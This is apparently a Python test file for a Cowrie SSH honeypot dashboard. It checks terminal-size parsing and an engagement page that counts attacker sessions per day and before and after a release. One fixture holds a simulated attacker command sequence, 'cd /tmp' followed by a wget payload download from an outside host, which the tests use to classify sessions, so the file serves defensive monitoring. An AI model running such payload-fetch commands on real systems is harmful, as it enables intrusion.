# 0.32 Engagement page (sessions that got in, day by day, before/after a release) and the terminal size of a session.
import json, re, time, unittest
from datetime import datetime, timedelta

from tests.helpers import app

IP = "198.51.100.77"
IP2 = "198.51.100.78"


def at(days_ago, hour=12):
    # Today only the minutes after midnight are sure to be in the past, whenever the tests run.
    d = datetime.now(app.TZ).date() - timedelta(days=days_ago)
    if days_ago == 0:
        return min(datetime(d.year, d.month, d.day, tzinfo=app.TZ).timestamp() + hour, time.time() - 60 + hour - 24)
    return datetime(d.year, d.month, d.day, hour, tzinfo=app.TZ).timestamp()


def session(sid, start, cmds=(), ok=True, ip=IP, extra=(), gap=1.0, size=None):
    rows = [(ip, "connect", sid, "ssh", "2225")]
    if size:
        rows.append((ip, "termsize", sid, size, None))
    if ok:
        rows.append((ip, "login_ok", sid, "root", "pw"))
    rows += [(ip, "cmd", sid, c, None) for c in cmds]
    rows += list(extra)
    rows.append((ip, "closed", sid, "30.0", None))
    out, t = [], start
    for i, r in enumerate(rows):
        out.append(("e32|%s|%d" % (sid, i), t, r[0], "cowrie", r[1], r[2], r[3], r[4]))
        t += gap if r[1] == "cmd" else 0.1
    return out


class Parser(unittest.TestCase):
    def line(self, **kw):
        ev = {"eventid": "cowrie.client.size", "src_ip": "198.51.100.9", "session": "abc123", "timestamp": "2026-11-12T01:17:52.004121Z"}
        ev.update(kw)
        return app.p_cowrie(json.dumps(ev))

    def test_size(self):
        r = self.line(width=240, height=24)
        self.assertEqual((r[3], r[5]), ("termsize", "240x24"))

    def test_bad_sizes_dropped(self):
        for w, h in ((0, 24), (240, 0), (5000, 24), ("240", 24), (240.5, 24), (None, None), (True, 24)):
            self.assertIsNone(self.line(width=w, height=h), (w, h))

    def test_bookkeeping(self):
        self.assertIn("termsize", app.BOARD_SKIP)


class Base(unittest.TestCase):
    def setUp(self):
        self.con = app.connect()
        with self.con:
            for t in ("events", "sessions", "ips", "seen"):
                self.con.execute("DELETE FROM %s" % t)
        app._eng_cache.clear()

    def tearDown(self):
        with self.con:
            for t in ("events", "sessions", "ips", "seen"):
                self.con.execute("DELETE FROM %s" % t)
        app._eng_cache.clear()

    def add(self, *sessions):
        rows = []
        for s in sessions:
            rows += s
        app.store(self.con, rows)


class TermSize(Base):
    def test_stored_on_session_and_shown(self):
        self.add(session("ts1", at(0, 10), ["id", "ls"], size="132x43"))
        self.assertEqual(self.con.execute("SELECT termsize FROM sessions WHERE session='ts1'").fetchone()[0], "132x43")
        html = app.v_ip(IP)
        self.assertIn("terminal <span class=mono>132×43</span>", html)

    def test_sizes_table(self):
        self.add(session("a", at(0, 9), ["id"], size="240x24"), session("b", at(0, 10), ["id"], size="240x24", ip=IP2),
                 session("c", at(0, 11), size="80x24"))
        d = app.engagement_data(self.con, 7)
        top = d["sizes"][0]
        self.assertEqual((top["size"], top["n"], top["ips"], top["cmds"]), ("240x24", 2, 2, 2))
        self.assertEqual((d["asked"], d["shells"], d["sized"]), (3, 2, 2))


class Engagement(Base):
    def test_outcomes_per_day(self):
        self.add(session("l", at(1)),                                      # left at once
                 session("p", at(1, 13), extra=[(IP, "tcpip", "p", "203.0.113.5:80", None)]),
                 session("c", at(1, 14), ["uname -a", "id"]),
                 session("w", at(1, 15), ["cd /tmp", "wget http://203.0.113.9/x"]),
                 session("f", at(1, 16), ok=False),                        # never got in: not counted
                 session("t", at(0, 9), ["id", "ls", "w"], gap=5.0))       # typed by hand, today
        d = app.engagement_data(self.con, 7)
        yday = dict(d["days"])[(datetime.now(app.TZ).date() - timedelta(days=1)).strftime("%Y-%m-%d")]
        self.assertEqual((yday["n"], yday["left"], yday["proxy"], yday["cmds"], yday["payload"], yday["human"]), (4, 1, 1, 1, 1, 0))
        self.assertEqual(d["total"]["n"], 5)
        self.assertEqual(d["total"]["human"], 1)
        self.assertEqual(len(d["labels"]), 7)

    def test_new_and_returning(self):
        with self.con:
            self.con.execute("INSERT OR REPLACE INTO ips(ip, first, last) VALUES(?,?,?)", (IP2, at(5), at(0)))
        self.add(session("n1", at(0, 9)), session("r1", at(0, 10), ip=IP2))
        with self.con:
            self.con.execute("UPDATE ips SET first=? WHERE ip=?", (at(5), IP2))
        app._eng_cache.clear()
        t = app.engagement_data(self.con, 7)["total"]
        self.assertEqual((t["ips"], t["new_ips"]), (2, 1))

    def test_before_after_release(self):
        ver, vdate = app.CHANGELOG[0][0], app.CHANGELOG[0][1]
        vday = datetime.strptime(vdate, "%Y-%m-%d").date()
        days_after = (datetime.now(app.TZ).date() - vday).days - 1
        d = app.engagement_data(self.con, 7, ver)
        self.assertEqual(d["cmp"]["version"], ver)
        self.assertEqual(d["cmp"]["days"], max(0, min(7, days_after)))
        self.assertIsNone(app.engagement_data(self.con, 7, "9.9.9")["cmp"])

    def test_before_after_counts(self):
        old = list(app.CHANGELOG)
        vday = datetime.now(app.TZ).date() - timedelta(days=4)
        try:
            app.CHANGELOG.insert(0, ("9.0.0", vday.strftime("%Y-%m-%d"), "test"))
            self.add(session("b1", at(6)), session("b2", at(5), ["id"]),            # before
                     session("x", at(4)),                                           # release day: left out
                     session("a1", at(3), ["id"]), session("a2", at(2), ["id"]), session("a3", at(1), ["id"]))
            c = app.engagement_data(self.con, 14, "9.0.0")["cmp"]
            self.assertEqual(c["days"], 3)
            self.assertEqual((c["before"]["n"], c["after"]["n"]), (2, 3))
            self.assertEqual((c["before"]["left"], c["after"]["cmds"]), (1, 3))
        finally:
            app.CHANGELOG[:] = old


class Page(Base):
    def test_renders_without_inline_style(self):
        self.add(session("a", at(0, 9), ["id"], size="240x24"), session("b", at(1)))
        for qs in ({}, {"days": "30"}, {"days": "999"}, {"v": app.CHANGELOG[0][0]}, {"v": "<script>"}, {"days": "x"}):
            html = app.v_engagement(qs)
            self.assertIn("<h1>Engagement</h1>", html)
            self.assertNotIn("<script>", html.split("</head>", 1)[-1].replace('<script src=', ''))
            self.assertIsNone(re.search(r"\sstyle=", html), qs)
        self.assertIn("240×24", app.v_engagement({}))

    def test_empty(self):
        html = app.v_engagement({})
        self.assertIn("No sessions got in during these days", html)
        self.assertIn("No session asked for a terminal size", html)

    def test_nav(self):
        self.assertIn(("/engagement", "Engagement"), app.NAV)


if __name__ == "__main__":
    unittest.main()
